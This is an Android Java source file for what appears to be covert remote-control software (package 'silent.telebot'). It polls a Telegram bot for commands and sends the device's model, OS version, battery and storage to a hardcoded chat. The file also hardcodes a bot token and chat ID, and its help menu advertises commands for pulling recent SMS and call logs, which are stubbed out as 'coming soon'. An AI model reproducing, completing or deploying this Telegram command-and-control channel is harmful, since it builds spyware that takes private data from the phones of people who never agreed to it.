package com.silent.telebot;

import android.content.Context;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramPoller implements Runnable {
    private Context ctx;

    // ⚠️ ضع التوكن و CHAT_ID الصحيحين هنا ⚠️
    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";
    private static final String CHAT_ID = "7058836561";

    private static int lastUpdateId = 0;

    public TelegramPoller(Context ctx) {
        this.ctx = ctx;
    }

    @Override
    public void run() {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            int responseCode = conn.getResponseCode();
            if (responseCode != 200) {
                sendMessage("❌ خطأ في الاتصال بالبوت (كود: " + responseCode + ")");
                return;
            }

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) response.append(line);
            reader.close();
            conn.disconnect();

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (jsonResponse.getBoolean("ok")) {
                JSONArray updates = jsonResponse.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        handleCommand(text);
                    }
                }
            } else {
                sendMessage("❌ استجابة غير صحيحة من التيليجرام");
            }

        } catch (Exception e) {
            sendMessage("❌ خطأ في البوت: " + e.getMessage());
            Log.e("TelegramPoller", "Error: " + e.getMessage());
        }
    }

    private void handleCommand(String cmd) {
        if (cmd.equals("/help")) {
            sendMessage("📋 **الأوامر المتاحة**\n" +
                    "/help - عرض هذه القائمة\n" +
                    "/status - معلومات الجهاز\n" +
                    "/get_sms - عرض آخر 10 رسائل\n" +
                    "/get_calls - عرض آخر 10 مكالمات");
        } else if (cmd.equals("/status")) {
            String info = "📱 **معلومات الجهاز**\n" +
                    "🔋 البطارية: " + getBattery() + "%\n" +
                    "📲 الطراز: " + Build.MODEL + "\n" +
                    "🤖 الإصدار: " + Build.VERSION.RELEASE + "\n" +
                    "💾 المساحة المتاحة: " + getAvailableStorage() + " GB";
            sendMessage(info);
        } else if (cmd.equals("/get_sms")) {
            sendMessage("📩 سيتم عرض الرسائل قريباً...");
        } else if (cmd.equals("/get_calls")) {
            sendMessage("📞 سيتم عرض المكالمات قريباً...");
        } else {
            sendMessage("❌ أمر غير معروف. استخدم /help");
        }
    }

    private int getBattery() {
        try {
            android.os.BatteryManager bm = (android.os.BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
            return bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY);
        } catch (Exception e) {
            return 0;
        }
    }

    private String getAvailableStorage() {
        try {
            StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
            long bytes = stat.getAvailableBytes();
            return String.format("%.2f", bytes / (1024.0 * 1024.0 * 1024.0));
        } catch (Exception e) {
            return "0.00";
        }
    }

    private void sendMessage(String text) {
        try {
            String encoded = java.net.URLEncoder.encode(text, "UTF-8");
            String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encoded;
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }

    public static void sendMessageStatic(String chatId, String text) {
        try {
            String encoded = java.net.URLEncoder.encode(text, "UTF-8");
            String url = "https://api.telegram.org/bot" + BOT_TOKEN +
                    "/sendMessage?chat_id=" + chatId + "&text=" + encoded;
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception ignored) {}
    }
}د
